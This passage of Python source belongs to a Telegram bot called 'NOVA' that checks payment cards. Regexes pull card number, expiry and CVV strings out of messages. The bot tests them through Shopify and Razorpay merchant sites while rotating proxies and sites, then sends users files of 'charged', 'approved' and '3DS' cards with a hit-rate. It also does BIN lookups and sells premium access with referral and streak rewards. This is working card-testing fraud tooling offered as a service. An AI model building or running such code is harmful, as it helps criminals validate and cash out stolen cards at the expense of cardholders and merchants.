            else:
                for i, item in enumerate(items, 1):
                    card = item.get('card', '-')
                    resp = (item.get('message') or item.get('Response') or '')[:120]
                    gw = item.get('gateway') or item.get('Gateway') or gateway
                    price = item.get('price') or item.get('Price') or '-'
                    site = item.get('site', '-') or '-'
                    code = item.get('status_code', '-') or '-'
                    f.write(f"[{i:>4}] {card}\n")
                    f.write(f"        Response : {resp}\n")
                    f.write(f"        Gateway  : {gw}\n")
                    f.write(f"        Price    : {price}\n")
                    f.write(f"        Site     : {site}\n")
                    f.write(f"        Code     : {code}\n")
                    f.write("-" * 40 + "\n")
            f.write(f"\nEnd of {title} — {len(items)} card(s)\n")
    except Exception as e:
        log_system("EXPORT", f"write {fname} failed: {e}", "error")


async def send_final_results(user_id: int, results: dict, gateway_type: str = "Shopify"):
    elapsed = int(time.time() - results.get('start_time', time.time()))
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    time_fmt = f"{h}h {m}m {s}s" if h else f"{m}m {s}s" if m else f"{s}s"

    charged = results.get('charged', [])
    approved = results.get('approved', [])
    threeds = results.get('3ds', [])
    dead = results.get('dead', [])
    errors = results.get('errors', [])

    n_charged = len(charged)
    n_approved = len(approved)
    n_3ds = len(threeds)
    n_dead = len(dead)
    n_errors = len(errors)
    total = results.get('total', 0) or 1
    hit_rate = ((n_charged + n_approved + n_3ds) / total * 100.0) if total else 0.0

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = "NOVA"

    summary = pe(f"""✅ <b>{bs('Check Complete')}</b>
{SEP}
📊 <b>{bs('Results')}</b> ({gateway_type}):
   ┣ 🥇 {bs('Charged')}:  {n_charged}
   ┣ 🥈 {bs('Approved')}: {n_approved}
   ┣ 🥉 {bs('3DS')}:      {n_3ds}
   ┣ 🥔 {bs('Declined')}: {n_dead}
   ┣ 🧨 {bs('Errors')}:   {n_errors}
   ┗ 📊 {bs('Total')}:    {results.get('total', 0)}
{SEP}
🎯 {bs('Hit-rate')}: <b>{hit_rate:.2f}%</b>
⏱️ {bs('Time')}: {time_fmt}
{SEP}
📁 {bs('5 files below')} ⬇️""")
    try:
        await send_entities(user_id, summary)
    except Exception as e:
        log_system("RESULT", f"summary send failed: {e}", "error")

    categories = [
        ("CHARGED",  charged,  "🥇", "success"),
        ("APPROVED", approved, "🥈", "primary"),
        ("3DS",      threeds,  "🥉", "primary"),
        ("DECLINED", dead,     "🥔", "danger"),
        ("ERRORS",   errors,   "🧨", "danger"),
    ]
    for cat_name, items, emoji, style in categories:
        fname = f"{prefix}_{cat_name}_{user_id}_{timestamp}.txt"
        _write_result_file(fname, f"{cat_name} CARDS", items, gateway_type)
        caption = pe(f"{emoji} <b>{bs(cat_name)}</b> — <code>{len(items)}</code>")
        try:
            await send_file_entities(user_id, fname, caption)
        except Exception as e:
            log_system("RESULT", f"send {cat_name} file failed: {e}", "error")
        try:
            os.remove(fname)
        except Exception:
            pass


# ====================== FREE GATE ======================
async def _check_free_or_premium(event, uid: int) -> bool:
    if uid in ADMIN_ID:
        return True
    if is_premium(uid):
        return True
    is_group = event.chat_id != uid
    if not is_group:
        await send_group_only(event)
        return False
    used = get_free_usage(uid)
    if used >= FREE_DAILY_LIMIT:
        await styled_reply(event, pe(f"""💎 <b>{bs('Daily limit')}</b>
{SEP}
💎 {bs('Used')}: <code>{used}/{FREE_DAILY_LIMIT}</code>
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
            buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                           style="success", icon="📩")]])
        return False
    left = free_cooldown_left(uid)
    if left > 0:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Wait')} {left}s</b>"))
        return False
    return True


def _consume_free(uid: int):
    if uid in ADMIN_ID or is_premium(uid):
        return
    set_free_last(uid)
    inc_free_usage(uid)


# ====================== MILESTONE / STREAK PAYOUT ======================
async def _process_milestone_payout(user_id: int):
    try:
        info = maybe_pay_milestone(user_id)
        if not info:
            return
        inviter_id = info["inviter_id"]
        hours = info["hours"]
        cc = info["cc_limit"]
        total = info["total_confirmed"]
        paid = info["milestones_paid"]
        nxt = info["next_milestone_at"]
        try:
            await send_entities(inviter_id, pe(
                f"🎉 <b>{bs('Milestone Unlocked!')}</b>\n{SEP}\n"
                f"👥 {bs('Confirmed referrals')}: <code>{total}</code>\n"
                f"🎁 {bs('Reward')}: <code>+{hours}h Premium</code>\n"
                f"💳 {bs('CC limit')}: <code>{cc}</code>\n"
                f"🏅 {bs('Milestones earned')}: <code>{paid}</code>\n"
                f"🎯 {bs('Next at')}: <code>{nxt}</code> referrals\n{SEP}\n"
                f"🚀 {bs('Keep inviting for more!')}"))
        except Exception:
            pass
        try:
            await send_entities(user_id, pe(
                f"🎁 <b>{bs('Welcome Bonus!')}</b>\n{SEP}\n"
                f"💎 {bs('Your first check activated a referral')}\n"
                f"🚀 {bs('Enjoy NOVA Premium features!')}"))
        except Exception:
            pass
        log_system("REFERRAL", f"MILESTONE paid inviter={inviter_id} total={total} +{hours}h cc={cc}")
    except Exception as e:
        log_system("REFERRAL", f"milestone error: {e}", "error")


async def _process_streak_update(user_id: int):
    try:
        info = update_streak(user_id)
        r = info.get("reward")
        if not r:
            return
        try:
            await send_entities(user_id, pe(
                f"🔥 <b>{bs('Streak Milestone!')}</b>\n{SEP}\n"
                f"📅 <b>{bs('Day')} {r['day']}</b> {bs('streak unlocked')}\n"
                f"🎁 <b>+{r['hours']}h Premium</b> {bs('added')}\n"
                f"🔥 {bs('Current streak')}: <code>{info['current']}</code>\n"
                f"🏆 {bs('Best')}: <code>{info['best']}</code>\n{SEP}\n"
                f"💡 {bs('Keep checking daily!')}"))
        except Exception:
            pass
        log_system("STREAK", f"user={user_id} day={r['day']} +{r['hours']}h")
    except Exception as e:
        log_system("STREAK", f"update error: {e}", "error")


async def _process_referral_payout(user_id: int):
    await _process_milestone_payout(user_id)


# ====================== UTILITIES ======================
def extract_cc(text: str) -> list:
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(
        r'(\d{15,16})[\s|/\\:]+(\d{1,2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2:
            y = '20' + y
        cards.append(f"{c}|{m.zfill(2)}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(
            r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url: str) -> bool:
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try:
            d = urlparse(url).netloc
        except Exception:
            return False
    return bool(re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$',
        d))


def normalize_site_url(url: str) -> str:
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url).rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url


def normalize_rz_url(url: str) -> str:
    """Razorpay URLs keep path — pages.razorpay.com/<slug> is the identifier."""
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')


def extract_urls(text: str) -> list:
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
    return result


def extract_rz_urls(text: str) -> list:
    """Razorpay URL extractor — preserves path."""
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_rz_url(m.group(1))
            if n and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_rz_url(cleaned)
            if n and n not in seen:
                seen.add(n); result.append(n)
    return result


def parse_proxy_format(proxy: str):
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt}


def proxy_to_url(proxy: str) -> str:
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    if p['username'] and p['password']:
        return f"{p['type']}://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    return f"{p['type']}://{p['ip']}:{p['port']}"


def is_site_error(t):
    if not t:
        return False
    tl = str(t).lower().strip()
    dead_markers = [
        "shop not found", "store not found", "site not found",
        "invalid site", "invalid store", "no such shop",
        "domain not found", "could not resolve", "dns error",
        "store is unavailable", "shop is unavailable",
        "this store is unavailable", "this shop is currently unavailable",
        "currently unavailable", "store closed", "shop closed",
        "storefront is password protected", "password protected",
    ]
    return any(k in tl for k in dead_markers)


def is_proxy_error(t):
    if not t:
        return False
    tl = str(t).lower()
    keys = ["proxy", "407", "tunnel", "connection reset", "socks",
            "proxy_required", "proxy required", "proxy_invalid"]
    return any(k in tl for k in keys)


def is_rz_retry_error(t):
    if not t:
        return True
    tl = str(t).lower()
    keys = ["timeout", "retry", "error", "failed", "502", "503", "504"]
    return any(k in tl for k in keys)


# ====================== HTTP SESSIONS ======================
_GLOBAL_HTTP = None
_GLOBAL_BIN  = None
_GLOBAL_PROXY = None


async def get_http_session():
    global _GLOBAL_HTTP
    if _GLOBAL_HTTP is None or _GLOBAL_HTTP.closed:
        _GLOBAL_HTTP = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=45, connect=10),
            connector=aiohttp.TCPConnector(
                limit=500, limit_per_host=200,
                ttl_dns_cache=600, use_dns_cache=True,
                enable_cleanup_closed=True,
            ),
        )
    return _GLOBAL_HTTP


async def get_bin_session():
    global _GLOBAL_BIN
    if _GLOBAL_BIN is None or _GLOBAL_BIN.closed:
        _GLOBAL_BIN = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=10),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_BIN


async def get_proxy_session():
    global _GLOBAL_PROXY
    if _GLOBAL_PROXY is None or _GLOBAL_PROXY.closed:
        _GLOBAL_PROXY = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30, connect=20),
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
        )
    return _GLOBAL_PROXY


# ====================== PER-USER SEMAPHORES ======================
_USER_SEMS = {}


def get_user_sem(uid, t="msp"):
    key = (uid, t)
    sem = _USER_SEMS.get(key)
    if sem is None:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "rz": RZ_PER_USER_WORKERS,
            "mrz": MRZ_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "harvest": HARVEST_PER_USER_WORKERS,
        }
        sem = asyncio.Semaphore(limits.get(t, 20))
        _USER_SEMS[key] = sem
    return sem


def cleanup_user_sem(uid):
    for k in [k for k in list(_USER_SEMS.keys()) if k[0] == uid]:
        _USER_SEMS.pop(k, None)


async def get_user_http_session(uid, purpose="general"):
    return await get_http_session()


async def cleanup_user_http_session(uid, purpose="general"):
    pass


# ====================== SMART ROTATOR ======================
class SmartRotator:
    def __init__(self):
        self._sf, self._pf = {}, {}

    def pick_site(self, sites, exclude=None):
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude] or sites
        return random.choice(available) if available else None

    def pick_proxy(self, proxies, exclude=None):
        exclude = exclude or set()
        available = [p for p in proxies if p not in exclude] or proxies
        return random.choice(available) if available else None

    def report_site_ok(self, s):   pass
    def report_site_fail(self, s): pass
    def report_proxy_ok(self, p):  pass
    def report_proxy_fail(self, p): pass


# ====================== BIN LOOKUP ======================
_BIN_CACHE = {}


async def get_bin_info_cached(card_number, session):
    cn = card_number[:6] if card_number else ''
    if not cn or len(cn) < 6:
        return ('-', '-', '-', '-', '-', '')
    if cn in _BIN_CACHE:
        return _BIN_CACHE[cn]
    try:
        url = f"https://lookup.binlist.net/{cn}"
        headers = {'Accept-Version': '3'}
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                scheme = data.get('scheme', '-') or '-'
                typ = data.get('type', '-') or '-'
                brand = data.get('brand', '-') or '-'
                bank = (data.get('bank') or {}).get('name', '-') or '-'
                country = (data.get('country') or {}).get('name', '-') or '-'
                flag = (data.get('country') or {}).get('emoji', '') or ''
                result = (scheme.upper(), typ.upper(), brand.upper(), bank, country, flag)
                _BIN_CACHE[cn] = result
                return result
    except Exception:
        pass
    return ('-', '-', '-', '-', '-', '')


async def get_bin_info(card_number: str):
    return await get_bin_info_cached(card_number, await get_bin_session())


def build_status_text():
    if not PSUTIL_AVAILABLE:
        return pe(f"💎 <b>{bs('Status')}</b>\n{SEP}\n💎 <i>psutil unavailable</i>")
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        uptime_sec = time.time() - BOT_START_TIME
        h, m, s = int(uptime_sec // 3600), int((uptime_sec % 3600) // 60), int(uptime_sec % 60)
        return pe(f"""💎 <b>{bs('System Status')}</b>
{SEP}
💻 CPU: <code>{cpu}%</code>
🧠 RAM: <code>{mem.percent}%</code> ({mem.used // (1024**2)}MB / {mem.total // (1024**2)}MB)
💾 Disk: <code>{disk.percent}%</code>
⏰ Uptime: <code>{h}h {m}m {s}s</code>
{SEP}
🤖 {bs('NOVA Bot Online')}""")
    except Exception as e:
        return pe(f"💎 <b>{bs('Status error')}</b>: <code>{e}</code>")


# ====================== REFERRALS ======================
def load_referrals() -> dict:
    data = _read_json(REFERRALS_FILE, None)
    if not isinstance(data, dict):
        data = {"users": {}, "codes": {}}
    data.setdefault("users", {})
    data.setdefault("codes", {})
    return data


def save_referrals(data: dict):
    _write_json(REFERRALS_FILE, data)


def _gen_ref_code(user_id: int) -> str:
    base = f"NOVA{user_id}{time.time()}{random.random()}"
    h = hashlib.sha1(base.encode()).hexdigest().upper()
    return "NOVA" + h[:6]


def get_or_create_ref_code(user_id: int) -> str:
    uid = str(user_id)
    data = load_referrals()
    u = data["users"].get(uid)
    if u and u.get("code"):
        return u["code"]
    code = _gen_ref_code(user_id)
    while code in data["codes"]:
        code = _gen_ref_code(user_id + random.randint(1, 9999999))
    data["users"][uid] = {
        "code": code, "referred_by": None, "referrals": [],
        "pending": [], "rewarded": [], "milestones_paid": 0,
        "total_hours_earned": 0, "total_cc_upgrades": 0,
        "created_at": datetime.now().isoformat(),
    }
    data["codes"][code] = uid
    save_referrals(data)
    return code


def find_user_by_code(code: str):
    data = load_referrals()
    uid = data["codes"].get((code or "").upper().strip())
    return int(uid) if uid else None


def attach_referral(new_user_id: int, ref_code: str) -> bool:
    if not ref_code:
        return False
    inviter_id = find_user_by_code(ref_code)
    if not inviter_id or inviter_id == new_user_id:
        return False
    data = load_referrals()
    new_uid = str(new_user_id)
    inv_uid = str(inviter_id)
    if new_uid in data["users"] and data["users"][new_uid].get("referred_by"):
        return False
    if new_uid not in data["users"]:
        save_referrals(data)
        get_or_create_ref_code(new_user_id)
        data = load_referrals()
    if inv_uid not in data["users"]:
        save_referrals(data)
        get_or_create_ref_code(inviter_id)
        data = load_referrals()
    data["users"][new_uid]["referred_by"] = inviter_id
    inviter = data["users"][inv_uid]
    if new_user_id not in inviter.get("pending", []):
        inviter.setdefault("pending", []).append(new_user_id)
    save_referrals(data)
    return True


def _grant_milestone(user_id: int, hours: int, cc_limit: int):
    if user_id in ADMIN_ID:
        return
    data = load_premium_users()
    uid = str(user_id)
    now = datetime.now()
    entry = data.get(uid)
    if entry is None:
        return
    if isinstance(entry, dict):
        exp = entry.get("expiry")
        base_ts = now.timestamp()
        if exp:
            try:
                base_ts = max(float(exp), now.timestamp())
            except Exception:
                pass
        entry["expiry"] = base_ts + hours * 3600
        old_cc = int(entry.get("cc_limit", 0))
        entry["cc_limit"] = max(old_cc, cc_limit)
        entry["milestone_bonus_hours"] = int(entry.get("milestone_bonus_hours", 0)) + hours
        entry.setdefault("activated_at", now.isoformat())
    else:
        try:
            base_ts = max(float(entry), now.timestamp())
        except Exception:
            base_ts = now.timestamp()
        data[uid] = {
            "expiry": base_ts + hours * 3600,
            "cc_limit": cc_limit,
            "milestone_bonus_hours": hours,
            "activated_at": now.isoformat(),
        }
    save_premium_users(data)


def maybe_pay_milestone(new_user_id: int):
    if REFERRAL_MIN_CHECKS > 0 and count_successful_checks(new_user_id) < REFERRAL_MIN_CHECKS:
        return None
    data = load_referrals()
    new_uid = str(new_user_id)
    u = data["users"].get(new_uid)
    if not u:
        return None
    inviter_id = u.get("referred_by")
    if not inviter_id:
        return None
    inv_uid = str(inviter_id)
    inviter = data["users"].get(inv_uid)
    if not inviter:
        return None
    pending = inviter.get("pending", [])
    rewarded = inviter.get("rewarded", [])
    if new_user_id in rewarded or new_user_id not in pending:
        return None
    inviter["pending"] = [x for x in pending if x != new_user_id]
    inviter.setdefault("rewarded", []).append(new_user_id)
    inviter.setdefault("referrals", []).append(new_user_id)
    inviter["referrals"] = list(dict.fromkeys(inviter["referrals"]))
    total_confirmed = len(inviter["rewarded"])
    if total_confirmed > REFERRAL_MAX_PER_USER:
        save_referrals(data)
        return None
    every = REFERRAL_MILESTONE_EVERY
    paid_already = int(inviter.get("milestones_paid", 0))
    milestones_due = total_confirmed // every
    milestone_fired = False
    if milestones_due > paid_already:
        _grant_milestone(inviter_id, REFERRAL_MILESTONE_HOURS,
                         REFERRAL_MILESTONE_CC_LIMIT)
        inviter["milestones_paid"] = paid_already + 1
        inviter["total_hours_earned"] = (
            int(inviter.get("total_hours_earned", 0)) + REFERRAL_MILESTONE_HOURS
        )
        inviter["total_cc_upgrades"] = int(inviter.get("total_cc_upgrades", 0)) + 1
        milestone_fired = True
    save_referrals(data)
    if milestone_fired:
        return {
            "inviter_id": inviter_id,
            "hours": REFERRAL_MILESTONE_HOURS,
            "cc_limit": REFERRAL_MILESTONE_CC_LIMIT,
            "total_confirmed": total_confirmed,
            "milestones_paid": inviter["milestones_paid"],
            "next_milestone_at": (inviter["milestones_paid"] + 1) * every,
        }
    return None


def referral_stats(user_id: int) -> dict:
    get_or_create_ref_code(user_id)
    data = load_referrals()
    u = data["users"].get(str(user_id), {})
    confirmed = len(u.get("rewarded", []))
    pending = len(u.get("pending", []))
    every = REFERRAL_MILESTONE_EVERY
    paid = int(u.get("milestones_paid", 0))
    to_next = (every - (confirmed % every)) if (confirmed % every) else every
    return {
        "code": u.get("code", ""),
        "confirmed": confirmed,
        "pending": pending,
        "total": confirmed + pending,
        "milestones_paid": paid,
        "next_milestone_in": to_next,
        "total_hours": int(u.get("total_hours_earned", 0)),
        "cc_upgrades": int(u.get("total_cc_upgrades", 0)),
        "referred_by": u.get("referred_by"),
    }


def reset_referrals_for_user(user_id: int):
    data = load_referrals()
    uid = str(user_id)
    if uid not in data["users"]:
        return False
    u = data["users"][uid]
    u["pending"] = []
    u["rewarded"] = []
    u["referrals"] = []
    u["milestones_paid"] = 0
    u["total_hours_earned"] = 0
    u["total_cc_upgrades"] = 0
    save_referrals(data)
    return True


# ====================== STREAK ======================
def load_streaks() -> dict:
    data = _read_json(STREAKS_FILE, None)
    if not isinstance(data, dict):
        data = {}
    return data


def save_streaks(data: dict):
    _write_json(STREAKS_FILE, data)


def _today_str() -> str:
    return datetime.now().strftime("%Y-%m-%d")


def _yesterday_str() -> str:
    return (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")


def update_streak(user_id: int) -> dict:
    data = load_streaks()
    uid = str(user_id)
    now = datetime.now()
    entry = data.get(uid) or {
        "current": 0, "best": 0, "last_date": None, "last_ts": 0,
        "total_checks": 0, "milestones_claimed": [],
    }
    entry["total_checks"] = int(entry.get("total_checks", 0)) + 1
    today = _today_str()
    yesterday = _yesterday_str()
    last_date = entry.get("last_date")
    last_ts = float(entry.get("last_ts", 0) or 0)
    hours_since = (now.timestamp() - last_ts) / 3600.0 if last_ts else 999
    reward_info = None
    if last_date == today:
        pass
    elif last_date == yesterday and hours_since <= STREAK_MAX_GAP_HOURS:
        entry["current"] = int(entry.get("current", 0)) + 1
    elif hours_since < STREAK_MIN_GAP_HOURS and last_date != today:
        pass
    else:
        entry["current"] = 1
    if entry["current"] > int(entry.get("best", 0)):
        entry["best"] = entry["current"]
    entry["last_date"] = today
    entry["last_ts"] = now.timestamp()
    cur = entry["current"]
    if cur in STREAK_MILESTONES and cur not in entry.get("milestones_claimed", []):
        bonus_h = STREAK_MILESTONES[cur]
        _grant_streak_hours(user_id, bonus_h)
        entry.setdefault("milestones_claimed", []).append(cur)
        reward_info = {"day": cur, "hours": bonus_h}
    data[uid] = entry
    save_streaks(data)
    return {"current": entry["current"], "best": entry["best"],
            "total_checks": entry["total_checks"], "reward": reward_info}


def _grant_streak_hours(user_id: int, hours: int):
    if user_id in ADMIN_ID:
        return
    data = load_premium_users()
    uid = str(user_id)
    now = datetime.now()
    entry = data.get(uid)
    if entry is None:
        return
    if isinstance(entry, dict):
        exp = entry.get("expiry")
        base_ts = now.timestamp()
        if exp:
            try:
                base_ts = max(float(exp), now.timestamp())
            except Exception:
                pass
        entry["expiry"] = base_ts + hours * 3600
        entry["streak_bonus_hours"] = int(entry.get("streak_bonus_hours", 0)) + hours
    else:
        try:
            base_ts = max(float(entry), now.timestamp())
        except Exception:
            base_ts = now.timestamp()
        data[uid] = {"expiry": base_ts + hours * 3600, "cc_limit": DEFAULT_KEY_CC_LIMIT,
                     "streak_bonus_hours": hours, "activated_at": now.isoformat()}
    save_premium_users(data)


def get_streak(user_id: int) -> dict:
    data = load_streaks()
    entry = data.get(str(user_id)) or {}
    return {"current": int(entry.get("current", 0)),
            "best": int(entry.get("best", 0)),
            "last_date": entry.get("last_date"),
            "total_checks": int(entry.get("total_checks", 0)),
            "milestones": entry.get("milestones_claimed", [])}


# =============================================================================
# COMMAND HANDLERS
# =============================================================================

# ====================== PROXY COMMANDS ======================
@client.on(events.NewMessage(pattern=r'^[/.]addproxy$'))
async def cmd_addproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)

    lines = []
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply and reply.file:
            try:
                path = await reply.download_media()
                async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [ln.strip() for ln in (await f.read()).splitlines() if ln.strip()]
                os.remove(path)
            except Exception as e:
                return await styled_reply(event, pe(f"💎 <b>{bs('File error')}</b>: <code>{e}</code>"))
        elif reply and reply.text:
            lines = [ln.strip() for ln in reply.text.splitlines() if ln.strip()]
    else:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) == 2:
            lines = [ln.strip() for ln in parts[1].splitlines() if ln.strip()]

    if not lines:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Add proxies')}</b>\n{SEP}\n"
            f"💎 <i>Send one per line:</i>\n"
            f"<code>• /addproxy\nUS:ip:port:user:pass\nip:port</code>\n"
            f"{SEP}\n"
            f"💡 {bs('Tag with')} <code>US:</code> <code>DE:</code> <code>GB:</code> "
            f"{bs('for BIN matching')}"))

    current = load_user_proxies(uid)
    if len(current) >= MAX_PROXIES_PER_USER:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Proxy limit')}</b> <code>{len(current)}/{MAX_PROXIES_PER_USER}</code>"))

    existing = set()
    for p in current:
        pp = parse_proxy_format(_strip_country_from_proxy(p))
        if pp and pp.get('username') and pp.get('password'):
            existing.add(f"{pp['ip']}:{pp['port']}:{pp['username']}:{pp['password']}")
        elif pp:
            existing.add(f"{pp['ip']}:{pp['port']}")
        else:
            existing.add(p)

    to_check, duplicates = [], 0
    for raw in lines:
        clean = _strip_country_from_proxy(raw)
        parsed = parse_proxy_format(clean)
        if not parsed:
            log_system("PROXY_PARSE", f"rejected: {raw[:60]}", "warning")
            continue
        if parsed['username'] and parsed['password']:
            norm = f"{parsed['ip']}:{parsed['port']}:{parsed['username']}:{parsed['password']}"
        else:
            norm = f"{parsed['ip']}:{parsed['port']}"
        if norm in existing:
            duplicates += 1
            continue
        to_check.append(raw)
        existing.add(norm)

    if not to_check:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No new proxies')}</b>\n"
            f"💎 {bs('Duplicates')}: <code>{duplicates}</code>"))

    slots = MAX_PROXIES_PER_USER - len(current)
    to_check = to_check[:slots]
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking')} <code>{len(to_check)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead = [], []
    checked = 0

    async def _check_one(p):
        nonlocal checked
        clean = _strip_country_from_proxy(p)
        async with sem:
            res = await test_proxy(clean)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 10 == 0 or checked == len(to_check):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking')}</b> [{checked}/{len(to_check)}]\n"
                    f"✅ {bs('Alive')}: <code>{len(alive)}</code> | ❌ {bs('Dead')}: <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(to_check), PROXY_PER_USER_WORKERS):
            batch = to_check[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        if alive:
            save_user_proxies(uid, current + alive)
        total_now = len(load_user_proxies(uid))
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"✅ {bs('Alive (added)')}: <code>{len(alive)}</code>\n"
            f"❌ {bs('Dead (ignored)')}: <code>{len(dead)}</code>\n"
            f"⚠️ {bs('Existing (skipped)')}: <code>{duplicates}</code>\n"
            f"📁 {bs('Total')}: <code>{total_now}/{MAX_PROXIES_PER_USER}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                               parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]proxy$'))
async def cmd_proxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('No proxies')}</b> — <code>• /addproxy</code>"))
    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Checking')} <code>{len(proxies)}</code>..."))
    sem = get_user_sem(uid, "proxy")
    alive, dead, checked = [], [], 0

    async def _check_one(p):
        nonlocal checked
        clean = _strip_country_from_proxy(p)
        async with sem:
            res = await test_proxy(clean)
        checked += 1
        if res['status'] == 'alive':
            alive.append(p)
        else:
            dead.append(p)
        if checked % 10 == 0 or checked == len(proxies):
            try:
                await status_msg.edit(pe(
                    f"💎 <b>{bs('Checking proxies')}</b> [{checked}/{len(proxies)}]\n"
                    f"✅ <code>{len(alive)}</code> | ❌ <code>{len(dead)}</code>"
                ), parse_mode='html', link_preview=False)
            except Exception:
                pass

    try:
        for i in range(0, len(proxies), PROXY_PER_USER_WORKERS):
            batch = proxies[i:i + PROXY_PER_USER_WORKERS]
            await asyncio.gather(*[_check_one(p) for p in batch])
        save_user_proxies(uid, alive)
        await status_msg.edit(pe(
            f"✅ <b>{bs('Proxy check complete')}</b>\n{SEP}\n"
            f"📁 {bs('Total')}: <code>{len(proxies)}</code>\n"
            f"✅ {bs('Alive')}: <code>{len(alive)}</code>\n"
            f"🗑 {bs('Removed dead')}: <code>{len(dead)}</code>"
        ), parse_mode='html', link_preview=False)
    except Exception as e:
        await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"),
                               parse_mode='html')
    finally:
        cleanup_user_sem(uid)


@client.on(events.NewMessage(pattern=r'^[/.]chkproxy\s+'))
async def cmd_chkproxy(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(
